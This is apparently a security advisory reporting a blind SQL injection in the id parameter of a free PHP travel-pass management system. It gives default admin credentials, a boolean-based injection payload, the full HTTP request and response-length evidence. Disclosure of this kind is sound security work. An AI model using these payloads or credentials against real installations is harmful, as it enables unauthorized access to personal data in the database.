# Covid-19 Travel Pass Management System v1.0 by oretnom23 has SQL injection

Author： k0xx

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15308/covid-19-travel-pass-management-system-phpoop-free-source-code.html

Vulnerability File: /ctpms/admin/?page=applications/view_application&id=

Vulnerability location: /ctpms/admin/?page=applications/view_application&id=,id

[+] Payload: /ctpms/admin/?page=applications/view_application&id=1%27%20and%20length(database())%20=8--+ // Leak place ---> id

Current database name: ctpms_db,length is 8

```sql
GET /ctpms/admin/?page=applications/view_application&id=1%27%20and%20length(database())%20=8--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=sbd29ujtf9eelnf4f6rlt8ikfi
Connection: close
```
When length (database ()) = 7, Content-Length: 27877

![image](https://user-images.githubusercontent.com/54017627/167082359-bb4e0276-4c0f-47f5-b46f-5fde51305486.png)

![image](https://user-images.githubusercontent.com/54017627/167082433-f96ebd1f-c54c-466e-8f90-08d2058c73d5.png)

When length (database ()) = 8, Content-Length: 27944

![image](https://user-images.githubusercontent.com/54017627/167082332-76d12c0d-74f1-4c8f-ac3d-40f7280fedc9.png)

![image](https://user-images.githubusercontent.com/54017627/167082392-150c8c2c-f910-4c04-a6ce-b982aa05f457.png)

